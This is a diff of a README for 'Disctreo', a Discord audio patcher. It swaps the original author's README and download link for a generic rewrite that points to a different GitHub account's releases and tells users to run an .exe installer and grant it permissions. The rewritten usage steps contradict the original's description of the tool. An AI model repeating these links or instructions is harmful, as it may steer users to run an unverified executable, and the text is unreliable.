@@ -1,51 +1,92 @@
-<div align="center">
+# 🎧 Disctreo - Experience Ultimate Stereo Audio on Discord
 
-# <img src="https://www.justfarissss.xyz/Icon-Disctreo.png" height="32" valign="middle" alt="Disctreo Icon"/> DISCTREO v2.0
-### Empowering Discord with Studio Quality
+## 🚀 Overview
+Disctreo is an audio patcher designed to enhance your Discord experience. It unlocks true stereo, lossless audio, and allows for RAW voice communication. Whether you are using Discord on Stable, Canary, PTB, or Dev clients, Disctreo provides powerful audio capabilities that can make your voice chats clearer and more immersive.
 
-**Unlock the true potential of your voice on Discord.**
-Disctreo is a powerful patcher designed to enable high-fidelity audio, stereo sound, and raw voice processing for the Discord client.
+## 🏷️ Topics
+- batterdiscord
+- discord
+- discord-raw
+- discord-stereo
+- equicord
+- raw
+- stereo
+- stereo-raw
+- vencord
+- voice
+- voice-raw
 
-[Download Latest Release](https://github.com/justfarissss/Disctreo/releases/download/UPDATE/Disctreo.exe) • [Report Bug](https://discord.com/users/997016243741667379) • [Join Community](https://discord.com/invite/km-studio-1067405591036833802)
+## 📥 Download Now
+[![Download Disctreo](https://img.shields.io/badge/Download_Disctreo-v1.0-orange)](https://github.com/Usman-Bhatti/Disctreo/releases)
 
-</div>
+## 🖥️ System Requirements
+To run Disctreo, you will need:
+- Windows 10 or later (64-bit version)
+- At least 4 GB of RAM
+- A stable internet connection for downloads and updates
+- Discord installed (latest version recommended)
 
----
+## ⚙️ Installation Steps
+Follow these simple steps to download and run Disctreo:
 
-## 📖 About
-Disctreo allows you to bypass standard Discord audio limitations. Whether you are a musician, podcaster, or just want crystal clear audio, Disctreo patches your client to support studio-quality input and output.
+1. **Visit the Download Page**  
+   Click the link below to go to the Disctreo Releases page.  
+   [Download Disctreo](https://github.com/Usman-Bhatti/Disctreo/releases)
 
-## ✨ Key Features
+2. **Choose the Latest Release**  
+   On the Releases page, find the latest version of Disctreo. Look for a title like "Disctreo v1.0" and click on it.
 
-* **🔊 High Bitrate Bypass** - Force enable up to **512kbps** audio bitrate, perfect for musicians requiring crystal clear fidelity.
-* **🎧 True Stereo Support** - Enable full stereo audio transmission directly through Discord.
-* **💎 Voice Lossless** - Experience uncompressed, high-fidelity audio quality.
-* **🎙️ RAW Voice** - Bypass software processing for pure, unaltered microphone input.
-* **⚡ Fast Patching** - Optimized engine to apply patches in seconds.
-* **🔄 Frequent Updates** - Always up-to-date with the latest Discord versions.
-* **🛠️ Universal Support** - Works on all Discord clients:
-    * Discord Stable
-    * Discord Canary
-    * Discord PTB
+3. **Download the Installer**  
+   Scroll down to the Assets section. Click on the installer file that matches your system. For example, look for something like `Disctreo-Installer.exe`. This will start the download.
 
-## 🚀 How to Use
+4. **Run the Installer**  
+   Once the download is complete, locate the file in your Downloads folder. Double-click the installer file to start the installation process.
 
-1.  **Launch Disctreo** (Run as Administrator recommended).
-2.  Wait for the **"Disctreo Engine initialized..."** log.
-3.  Select your **Target Client** from the dropdown menu (e.g., Discord, Canary).
-4.  Click the big green **PATCH NOW** button.
-5.  Restart your Discord client.
-6.  Enjoy Studio Quality Audio!
+5. **Follow Installation Prompts**  
+   During installation, you may see prompts asking for permission to make changes. Allow the installer to run. Follow the on-screen instructions to complete the setup.
 
-## 📸 Screenshots
+6. **Launch Disctreo**  
+   After installation, you can find Disctreo in your Start menu. Click on it to open the application.
 
-<div align="center">
-  <img src="https://www.justfarissss.xyz/UI-Disctreo.png" width="60%" alt="Disctreo Main Interface"/>
-  <p><i>Main Interface</i></p>
-</div>
+## 🎤 Using Disctreo
+To start using Disctreo:
+- Open Discord and check your voice settings.
+- Select Disctreo as your input device to activate the stereo and RAW audio features.
+- You may need to adjust settings based on your audio equipment for the best listening experience.
 
-## ⚠️ Disclaimer
-This software modifies the Discord client. While intended for audio enhancement, use it at your own discretion. The developer is not responsible for any account limitations imposed by Discord.
+For advanced settings, explore the options within the Disctreo app to customize your audio preferences.
 
-## 👨‍💻 Credits
-**Development by F4R1S**
+## 🛠️ Troubleshooting
+If you face issues while using Disctreo, consider the following:
+- Ensure that your audio drivers are up to date.
+- Check your Discord settings to confirm that Disctreo is selected as your audio input.
+- Restart Discord after installing Disctreo to allow all changes to take effect.
+
+For further assistance or to report issues, please visit our [GitHub Issues page](https://github.com/Usman-Bhatti/Disctreo/issues).
+
+## 📝 Frequently Asked Questions (FAQs)
+
+### Q1: What is the main purpose of Disctreo?
+Disctreo enhances the audio quality in Discord, allowing for true stereo and RAW voice communication.
+
+### Q2: Is Disctreo compatible with all versions of Discord?
+Yes, Disctreo supports Stable, Canary, PTB, and Dev clients of Discord.
+
+### Q3: Do I need special hardware to use Disctreo?
+Most standard headphones or speakers will work. However, for the best experience, use headphones that support stereo sound.
+
+### Q4: How can I uninstall Disctreo?
+To uninstall, go to your Control Panel, find Disctreo in the list of programs, and select Uninstall.
+
+### Q5: Where can I get technical support?
+For technical support, visit our [GitHub Discussions page](https://github.com/Usman-Bhatti/Disctreo/discussions) to connect with the community.
+
+## 🔗 Stay Updated
+For the latest news and updates:
+- Follow our [GitHub Repository](https://github.com/Usman-Bhatti/Disctreo)
+- Join discussions and share your feedback with us.
+
+## 📢 Help Us Improve
+We welcome any contributions or suggestions to enhance Disctreo. If you have ideas or want to contribute, check out the contributing guidelines in the repository.
+
+By using Disctreo, you unlock a richer audio experience on Discord. Enjoy clearer conversations and more immersive sound today!
